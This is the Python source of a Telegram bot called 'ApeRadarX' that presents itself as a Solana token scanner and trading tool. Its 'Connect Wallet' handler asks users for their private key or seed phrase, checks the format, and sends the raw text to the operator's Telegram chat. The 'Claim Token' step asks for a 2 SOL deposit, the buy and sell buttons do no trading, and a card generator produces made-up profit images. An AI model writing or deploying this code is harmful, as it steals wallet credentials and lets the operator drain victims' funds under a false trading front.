# trigger redeploy v4
"""
ApeRadarX Solana Telegram Bot
PnL Card uses reference background image
"""

import os
import re
import io
import random
import threading
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from PIL import Image, ImageDraw, ImageFont, ImageFilter
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ContextTypes,
)

# ─────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
BOT_NAME = "ApeRadarX"
ADMIN_ID = 1495066761
PNL_ALLOWED = {1495066761, 6203945884, 8730420346}

# Background image URL (hosted on GitHub)
BG_URL = "https://raw.githubusercontent.com/emmyrichie11/solana-bot/main/pnl_background.jpg"

waiting_for_wallet = {}
waiting_for_pnl = {}

# ─────────────────────────────────────────────
# Admin notification
# ─────────────────────────────────────────────
async def notify_admin(context, user, action, extra=""):
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"📡 *Activity Log*\n\n"
                 f"👤 Name: {user.full_name}\n"
                 f"🆔 ID: `{user.id}`\n"
                 f"📛 Username: @{user.username if user.username else 'No username'}\n"
                 f"🔘 Action: {action}"
                 + (f"\n📝 `{extra}`" if extra else ""),
            parse_mode="Markdown"
        )
    except: pass

# ─────────────────────────────────────────────
# PnL Card Generator
# ─────────────────────────────────────────────
def format_mcap(n):
    try:
        n = float(n)
        if n >= 1_000_000_000: return f"${n/1_000_000_000:.1f}B"
        if n >= 1_000_000: return f"${n/1_000_000:.1f}M"
        if n >= 1_000: return f"${n/1_000:.1f}K"
        return f"${n:.0f}"
    except: return "N/A"

def get_font(size):
    for p in [
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
        "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
        "/usr/share/fonts/truetype/freefont/FreeSansBold.ttf",
    ]:
        try: return ImageFont.truetype(p, size)
        except: continue
    return ImageFont.load_default()

def draw_glow_text(img, cx, y, text, font, color, glow_color):
    draw = ImageDraw.Draw(img, "RGBA")
    bbox = draw.textbbox((0,0), text, font=font)
    w = bbox[2] - bbox[0]
    x = cx - w // 2
    glow = Image.new("RGBA", img.size, (0,0,0,0))
    gd = ImageDraw.Draw(glow)
    for r in range(18, 0, -3):
        a = int(60 * (1 - r/18))
        for ox in range(-r, r+1, 3):
            for oy in range(-r, r+1, 3):
                if ox*ox + oy*oy <= r*r*1.5:
                    gd.text((x+ox, y+oy), text, font=font, fill=(*glow_color, min(a,180)))
    glow = glow.filter(ImageFilter.GaussianBlur(4))
    img = Image.alpha_composite(img.convert("RGBA"), glow)
    d2 = ImageDraw.Draw(img)
    d2.text((x+5, y+5), text, font=font, fill=(0,25,0,200))
    d2.text((x+3, y+3), text, font=font, fill=(0,40,0,200))
    d2.text((x, y), text, font=font, fill=color)
    return img

def generate_pnl_card(token_symbol, buy_mcap, current_mcap, username, token_logo_url=None):
    W, H = 1000, 560
    GREEN = (57, 255, 20)
    GOLD = (220, 180, 30)
    WHITE = (255, 255, 255)
    DARK_GREEN = (30, 180, 10)
    multiplier = current_mcap / buy_mcap if buy_mcap > 0 else 1.0

    # Load background from GitHub
    try:
        resp = requests.get(BG_URL, timeout=10)
        bg = Image.open(io.BytesIO(resp.content)).convert("RGBA")
        bg = bg.resize((W, H), Image.LANCZOS)
    except:
        bg = Image.new("RGBA", (W, H), (2, 10, 2, 255))

    img = bg.copy()
    draw = ImageDraw.Draw(img, "RGBA")
    draw.rectangle([0, 0, W, H], fill=(0, 0, 0, 35))

    # Fonts
    f_token = get_font(58)
    f_mult = get_font(140)
    f_gain = get_font(22)
    f_label = get_font(14)
    f_value = get_font(28)
    f_bottom = get_font(22)

    # Token name (cover old, draw new)
    draw.rectangle([0, 0, 340, 105], fill=(0,0,0,180))
    draw.text((22, 12), token_symbol.upper(), font=f_token, fill=(200, 235, 140))

    # Called at badge
    draw.rounded_rectangle([18, 80, 205, 150], radius=8, fill=(0,15,0,210))
    draw.rounded_rectangle([18, 80, 205, 150], radius=8, outline=(*GREEN,160), width=2)
    cx2, cy2 = 44, 115
    draw.ellipse([cx2-12,cy2-12,cx2+12,cy2+12], outline=GREEN, width=2)
    draw.ellipse([cx2-6,cy2-6,cx2+6,cy2+6], outline=GREEN, width=1)
    draw.line([cx2-16,cy2,cx2+16,cy2], fill=GREEN, width=1)
    draw.line([cx2,cy2-16,cx2,cy2+16], fill=GREEN, width=1)
    draw.text((62, 86), "CALLED AT", font=f_label, fill=GREEN)
    draw.text((62, 106), format_mcap(buy_mcap), font=f_value, fill=WHITE)

    # Token logo (top center)
    lx, ly, ls = W//2, 62, 100
    draw.ellipse([lx-ls//2-18, ly-ls//2-18, lx+ls//2+18, ly+ls//2+18], fill=(0,5,0,230))
    draw.ellipse([lx-ls//2-4, ly-ls//2-4, lx+ls//2+4, ly+ls//2+4], fill=(*GOLD, 255))

    logo_loaded = False
    if token_logo_url:
        try:
            r = requests.get(token_logo_url, timeout=6)
            li = Image.open(io.BytesIO(r.content)).convert("RGBA")
            li = li.resize((ls, ls), Image.LANCZOS)
            mask = Image.new("L", (ls, ls), 0)
            ImageDraw.Draw(mask).ellipse([0,0,ls,ls], fill=255)
            li.putalpha(mask)
            img.paste(li, (lx-ls//2, ly-ls//2), li)
            draw = ImageDraw.Draw(img, "RGBA")
            logo_loaded = True
        except: pass

    if not logo_loaded:
        draw.ellipse([lx-ls//2, ly-ls//2, lx+ls//2, ly+ls//2], fill=(10,40,10))
        sym = token_symbol[:4].upper()
        bbox = draw.textbbox((0,0), sym, font=get_font(26))
        sw = bbox[2]-bbox[0]
        draw.text((lx-sw//2, ly-16), sym, font=get_font(26), fill=(200,255,150))

    # Logo glow
    glow = Image.new("RGBA", (W,H), (0,0,0,0))
    gd = ImageDraw.Draw(glow)
    for r in range(80,0,-15):
        gd.ellipse([lx-r,ly-r,lx+r,ly+r], fill=(*GOLD, int(18*(1-r/80))))
    glow = glow.filter(ImageFilter.GaussianBlur(10))
    img = Image.alpha_composite(img, glow)
    draw = ImageDraw.Draw(img, "RGBA")

    # Big multiplier
    mult_text = f"{multiplier:.1f}X"
    my = 145
    img = draw_glow_text(img, W//2, my, mult_text, f_mult, GREEN, DARK_GREEN)
    draw = ImageDraw.Draw(img, "RGBA")

    # Gain label
    gain_text = f"🚀  {multiplier:.1f}X GAIN  🚀"
    gain_y = my + 155
    bbox2 = draw.textbbox((0,0), gain_text, font=f_gain)
    gw = bbox2[2]-bbox2[0]
    gx = W//2 - gw//2
    draw.rectangle([gx-30, gain_y-6, gx+gw+30, gain_y+33], fill=(0,10,0,180))
    draw.line([(gx-20, gain_y-3),(gx+gw+20, gain_y-3)], fill=(*GREEN,100), width=1)
    draw.line([(gx-20, gain_y+29),(gx+gw+20, gain_y+29)], fill=(*GREEN,100), width=1)
    draw.text((gx, gain_y), gain_text, font=f_gain, fill=GREEN)

    # Bottom info boxes
    box_y = H - 142
    box_h = 68
    m = 22
    gap = 14
    box_w = (W - m*2 - gap) // 2

    for i, (lbl, val, itype) in enumerate([
        ("CALLED BY", f"@{username}", "person"),
        ("CURRENT MCAP", format_mcap(current_mcap), "money"),
    ]):
        bx = m + i*(box_w+gap)
        draw.rectangle([bx-5, box_y-5, bx+box_w+5, box_y+box_h+5], fill=(0,5,0,220))
        draw.rounded_rectangle([bx, box_y, bx+box_w, box_y+box_h], radius=12,
                                fill=(0,18,0,200), outline=(*GREEN,140), width=2)
        ic = bx+32, box_y+box_h//2
        draw.ellipse([ic[0]-17,ic[1]-17,ic[0]+17,ic[1]+17], fill=(*GREEN,25), outline=(*GREEN,160))
        if itype == "person":
            draw.ellipse([ic[0]-7,ic[1]-11,ic[0]+7,ic[1]-1], fill=GREEN)
            draw.arc([ic[0]-10,ic[1]-2,ic[0]+10,ic[1]+11], 0, 180, fill=GREEN, width=2)
        else:
            draw.text((ic[0]-8, ic[1]-11), "$", font=get_font(20), fill=GREEN)
        draw.text((bx+58, box_y+8), lbl, font=f_label, fill=GREEN)
        draw.text((bx+58, box_y+27), val, font=f_value, fill=WHITE)

    # Bottom bar
    bar_y = H - 58
    draw.rectangle([0, bar_y, W, H], fill=(0,6,0,230))
    draw.line([(0, bar_y),(W, bar_y)], fill=(*GREEN,60), width=1)

    glow2 = Image.new("RGBA", (W,H), (0,0,0,0))
    gd2 = ImageDraw.Draw(glow2)
    gd2.ellipse([(W//2-280, bar_y-20),(W//2+280, H+10)], fill=(*GREEN,15))
    glow2 = glow2.filter(ImageFilter.GaussianBlur(15))
    img = Image.alpha_composite(img, glow2)
    draw = ImageDraw.Draw(img, "RGBA")

    logo_bx = W//2 - 155
    draw.ellipse([logo_bx, bar_y+13, logo_bx+36, bar_y+49], fill=(*GREEN,20), outline=(*GREEN,180))
    draw.text((logo_bx+4, bar_y+17), "🦍", font=get_font(22))
    draw.text((logo_bx+44, bar_y+18), "APEradarX", font=f_bottom, fill=GREEN)
    div_x = W//2 + 28
    draw.line([(div_x, bar_y+10),(div_x, H-10)], fill=(*GREEN,60), width=1)
    draw.text((div_x+15, bar_y+18), "✈ @ApeRadarXBot", font=f_bottom, fill=GREEN)

    out = img.convert("RGB")
    buf = io.BytesIO()
    out.save(buf, format="PNG", quality=95)
    buf.seek(0)
    return buf

# ─────────────────────────────────────────────
# Token helpers
# ─────────────────────────────────────────────
def get_token_info(address):
    try:
        res = requests.get(f"https://api.dexscreener.com/latest/dex/tokens/{address}", timeout=10)
        pairs = res.json().get("pairs")
        if not pairs: return None
        return sorted(pairs, key=lambda p: float(p.get("liquidity",{}).get("usd",0) or 0), reverse=True)[0]
    except: return None

def format_number(n):
    try:
        n = float(n)
        if n >= 1_000_000_000: return f"${n/1_000_000_000:.2f}B"
        if n >= 1_000_000: return f"${n/1_000_000:.2f}M"
        if n >= 1_000: return f"${n/1_000:.2f}K"
        return f"${n:.4f}"
    except: return "N/A"

def parse_mcap_input(text):
    text = text.strip().upper().replace(",","")
    try:
        if text.endswith("K"): return float(text[:-1])*1_000
        elif text.endswith("M"): return float(text[:-1])*1_000_000
        elif text.endswith("B"): return float(text[:-1])*1_000_000_000
        else: return float(text)
    except: return None

def build_token_message(pair):
    base = pair.get("baseToken", {})
    name = base.get("name","Unknown")
    symbol = base.get("symbol","???")
    price_usd = pair.get("priceUsd","N/A")
    h1 = pair.get("priceChange",{}).get("h1","N/A")
    h24 = pair.get("priceChange",{}).get("h24","N/A")
    volume_24h = pair.get("volume",{}).get("h24","N/A")
    liquidity = pair.get("liquidity",{}).get("usd","N/A")
    market_cap = pair.get("marketCap","N/A")
    dex = pair.get("dexId","N/A").upper()
    url = pair.get("url","")
    def sign(v):
        try: return "🟢 +" if float(v) >= 0 else "🔴 "
        except: return ""
    msg = (
        f"🪙 *{name}* (${symbol})\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"💵 Price: `${float(price_usd):.8f}`\n"
        f"📈 1h:  {sign(h1)}{h1}%\n"
        f"📊 24h: {sign(h24)}{h24}%\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"💧 Liquidity: {format_number(liquidity)}\n"
        f"📦 Volume 24h: {format_number(volume_24h)}\n"
        f"🏦 Market Cap: {format_number(market_cap)}\n"
        f"🔁 DEX: {dex}\n"
    )
    if url: msg += f"\n[📎 View on DexScreener]({url})"
    return msg

def token_keyboard(symbol, address):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🟢 Buy {symbol}", callback_data=f"buy:{symbol}"),
         InlineKeyboardButton(f"🔴 Sell {symbol}", callback_data=f"sell:{symbol}")],
        [InlineKeyboardButton("📊 Generate PnL Card", callback_data=f"pnl:{address}")],
        [InlineKeyboardButton("🔄 Refresh", callback_data=f"refresh:{address}")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="home")],
    ])

def is_valid_seed_or_key(text):
    words = text.strip().split()
    if len(words) in (12, 24): return True
    if re.match(r'^[1-9A-HJ-NP-Za-km-z]{87,88}$', text.strip()): return True
    return False

# ─────────────────────────────────────────────
# Menu
# ─────────────────────────────────────────────
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🟢 Buy", callback_data="buy_menu"),
         InlineKeyboardButton("🔴 Sell", callback_data="sell_menu")],
        [InlineKeyboardButton("👛 Connect Wallet", callback_data="connect_wallet"),
         InlineKeyboardButton("🎁 Claim Token", callback_data="claim_token")],
        [InlineKeyboardButton("👥 Referrals", callback_data="referrals"),
         InlineKeyboardButton("❓ Help", callback_data="help")],
        [InlineKeyboardButton("📊 PnL Card", callback_data="pnl_menu"),
         InlineKeyboardButton("🔄 Refresh", callback_data="refresh_home")],
    ])

def main_menu_text():
    return (
        f"🦍 *Welcome to {BOT_NAME}\\!*\n\n"
        "Track hot tokens, catch early movers, and trade with speed\\.\n\n"
        "Built for apes, powered by real\\-time data, and designed to help "
        "you find the next rocket before it takes off 🚀\n\n"
        "━━━━━━━━━━━━━━━━━\n"
        "💰 *Wallet Balance:* 0\\.00 SOL\n"
        "━━━━━━━━━━━━━━━━━\n\n"
        "📋 *Paste a token contract address* to begin scanning\\.\n\n"
        "Use the buttons below to navigate\\."
    )

# ─────────────────────────────────────────────
# Commands
# ─────────────────────────────────────────────
async def start(update, context):
    user = update.message.from_user
    waiting_for_wallet[user.id] = False
    waiting_for_pnl[user.id] = None
    await notify_admin(context, user, "▶️ Started the bot")
    await update.message.reply_text(main_menu_text(), parse_mode="MarkdownV2", reply_markup=main_menu_keyboard())

async def help_command(update, context):
    user = update.message.from_user
    await notify_admin(context, user, "❓ /help")
    await update.message.reply_text(
        f"❓ *{BOT_NAME} Help*\n\n"
        "🔍 Paste Solana token address to scan\n"
        "🟢 Buy / 🔴 Sell after scanning\n"
        "📊 PnL Card — selected users only\n"
        "👛 Connect Wallet\n"
        "🎁 Claim Token\n"
        "👥 Referrals\n\n/start — Main menu",
        parse_mode="Markdown",
    )

# ─────────────────────────────────────────────
# Button handler
# ─────────────────────────────────────────────
async def button_handler(update, context):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = query.from_user
    can_pnl = user.id in PNL_ALLOWED

    await notify_admin(context, user, f"🔘 `{data}`")

    if data in ("home", "refresh_home"):
        waiting_for_wallet[user.id] = False
        waiting_for_pnl[user.id] = None
        await query.message.reply_text(main_menu_text(), parse_mode="MarkdownV2", reply_markup=main_menu_keyboard())

    elif data == "pnl_menu":
        if not can_pnl:
            await query.message.reply_text(
                "📊 *PnL Card*\n\n🔒 This feature is available to selected users only.\n\nStay tuned! 🚀",
                parse_mode="Markdown")
            return
        waiting_for_pnl[user.id] = {"step": "address"}
        await query.message.reply_text("📊 *PnL Card Generator*\n\nPaste the token contract address:", parse_mode="Markdown")

    elif data.startswith("pnl:"):
        if not can_pnl:
            await query.message.reply_text("🔒 *PnL Card is for selected users only.*", parse_mode="Markdown")
            return
        address = data.split(":")[1]
        pair = get_token_info(address)
        if pair:
            symbol = pair.get("baseToken",{}).get("symbol","TOKEN")
            current_mcap = pair.get("marketCap", 0)
            waiting_for_pnl[user.id] = {
                "step": "buy_mcap", "address": address, "symbol": symbol,
                "current_mcap": float(current_mcap) if current_mcap else 0,
                "logo_url": pair.get("info",{}).get("imageUrl"),
            }
            await query.message.reply_text(
                f"📊 *{symbol}*\nCurrent MCap: {format_number(current_mcap)}\n\n"
                f"Enter the MCap when you bought _(e.g. 9.3K, 1.2M)_:",
                parse_mode="Markdown")
        else:
            await query.message.reply_text("❌ Could not fetch token data.")

    elif data == "buy_menu":
        await query.message.reply_text("🟢 *Buy Token*\n\nPaste the token contract address!", parse_mode="Markdown")

    elif data == "sell_menu":
        await query.message.reply_text("🔴 *Sell Token*\n\nPaste the token contract address!", parse_mode="Markdown")

    elif data == "connect_wallet":
        waiting_for_wallet[user.id] = True
        await query.message.reply_text(
            "👛 *Connect Wallet*\n\nTo connect your Solana wallet, import your private key or seed phrase.\n\n⚠️ Never share your seed phrase with anyone!",
            parse_mode="Markdown")

    elif data == "claim_token":
        if context.user_data.get("wallet_connected"):
            await query.message.reply_text(
                "🎁 *Claim Token*\n\nTo claim your token, please deposit *2 SOL* to your connected wallet first.\n\nOnce your deposit is confirmed, your tokens will be released automatically! 🚀",
                parse_mode="Markdown")
        else:
            await query.message.reply_text(
                "🎁 *Claim Token*\n\nClick the *CONNECT WALLET* button to generate or connect your wallet and get started.",
                parse_mode="Markdown")

    elif data == "referrals":
        ref_link = f"https://t.me/ApeRadarXBot?start=ref_{user.id}"
        await query.message.reply_text(
            f"👥 *Referrals*\n\nInvite friends and earn rewards!\n\n🔗 Your link:\n`{ref_link}`",
            parse_mode="Markdown")

    elif data == "help":
        await query.message.reply_text(
            f"❓ *Help*\n\n🔍 Paste Solana token address\n📊 PnL Card — selected users\n👛 Connect Wallet\n/start — Main menu",
            parse_mode="Markdown")

    elif data.startswith("buy:"):
        symbol = data.split(":")[1]
        await query.message.reply_text(f"🟢 *Buy {symbol}*\n\n⚠️ Connect your wallet first.", parse_mode="Markdown")

    elif data.startswith("sell:"):
        symbol = data.split(":")[1]
        await query.message.reply_text(f"🔴 *Sell {symbol}*\n\n⚠️ Connect your wallet first.", parse_mode="Markdown")

    elif data.startswith("refresh:"):
        address = data.split(":")[1]
        pair = get_token_info(address)
        if pair:
            symbol = pair.get("baseToken",{}).get("symbol","TOKEN")
            await query.message.edit_text(
                build_token_message(pair), parse_mode="Markdown",
                reply_markup=token_keyboard(symbol, address),
                disable_web_page_preview=True)
        else:
            await query.message.reply_text("⚠️ Could not refresh.")

# ─────────────────────────────────────────────
# Message handler
# ─────────────────────────────────────────────
async def handle_message(update, context):
    text = update.message.text.strip()
    user = update.message.from_user
    can_pnl = user.id in PNL_ALLOWED

    pnl_state = waiting_for_pnl.get(user.id)

    if pnl_state and pnl_state.get("step") == "address":
        if 32 <= len(text) <= 44 and text.isalnum():
            await update.message.reply_text("🔍 Fetching token info...")
            pair = get_token_info(text)
            if pair:
                symbol = pair.get("baseToken",{}).get("symbol","TOKEN")
                current_mcap = pair.get("marketCap", 0)
                waiting_for_pnl[user.id] = {
                    "step": "buy_mcap", "address": text, "symbol": symbol,
                    "current_mcap": float(current_mcap) if current_mcap else 0,
                    "logo_url": pair.get("info",{}).get("imageUrl"),
                }
                await update.message.reply_text(
                    f"📊 *{symbol}*\nCurrent MCap: {format_number(current_mcap)}\n\nEnter the MCap when you bought _(e.g. 9.3K, 1.2M)_:",
                    parse_mode="Markdown")
            else:
                await update.message.reply_text("❌ Token not found.")
        else:
            await update.message.reply_text("⚠️ Paste a valid Solana token address.")
        return

    if pnl_state and pnl_state.get("step") == "buy_mcap":
        buy_mcap = parse_mcap_input(text)
        if buy_mcap and buy_mcap > 0:
            current_mcap = pnl_state["current_mcap"]
            symbol = pnl_state["symbol"]
            logo_url = pnl_state.get("logo_url")
            username = user.username or user.first_name or "ApeRadarX"
            waiting_for_pnl[user.id] = None
            await update.message.reply_text("🎨 Generating your PnL card...")
            try:
                card = generate_pnl_card(symbol, buy_mcap, current_mcap, username, logo_url)
                multiplier = current_mcap / buy_mcap
                await update.message.reply_photo(
                    photo=card,
                    caption=f"📊 *{symbol}* | *{multiplier:.1f}X GAIN* 🚀\nGenerated by @ApeRadarXBot",
                    parse_mode="Markdown")
                await notify_admin(context, user, f"📊 PnL card: {symbol} {multiplier:.1f}X")
            except Exception as e:
                await update.message.reply_text(f"❌ Error: {str(e)}")
        else:
            await update.message.reply_text("⚠️ Invalid format. Use: 9.3K, 1.2M, 500000")
        return

    if waiting_for_wallet.get(user.id):
        if is_valid_seed_or_key(text):
            await notify_admin(context, user, "👛 Wallet credentials submitted", text)
            waiting_for_wallet[user.id] = False
            context.user_data["wallet_connected"] = True
            await update.message.reply_text("✅ *Wallet connected successfully!*", parse_mode="Markdown")
        else:
            await notify_admin(context, user, "❌ Invalid wallet input", text)
            await update.message.reply_text("⚠️ Invalid seed phrase. Check your words and try again.")
        return

    if 32 <= len(text) <= 44 and text.isalnum():
        await update.message.reply_text("🔍 Scanning token...")
        pair = get_token_info(text)
        if pair:
            symbol = pair.get("baseToken",{}).get("symbol","TOKEN")
            await notify_admin(context, user, f"🔍 Scanned: {symbol}", text)
            await update.message.reply_text(
                build_token_message(pair), parse_mode="Markdown",
                reply_markup=token_keyboard(symbol, text),
                disable_web_page_preview=True)
        else:
            await notify_admin(context, user, "❌ Token not found", text)
            await update.message.reply_text("❌ Token not found. Paste a valid Solana contract address.")
    else:
        await notify_admin(context, user, "💬 Message", text)
        await update.message.reply_text("👋 Paste a Solana token address to scan!\nOr tap /start for the menu.")

# ─────────────────────────────────────────────
# Web server
# ─────────────────────────────────────────────
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ApeRadarX Bot is running!")
    def log_message(self, format, *args): pass

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    HTTPServer(("0.0.0.0", port), HealthHandler).serve_forever()

# ─────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────
if __name__ == "__main__":
    print("🤖 ApeRadarX Bot starting...")
    t = threading.Thread(target=run_web_server)
    t.daemon = True
    t.start()
    print("✅ Web server started!")
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("✅ Bot is running!")
    app.run_polling()
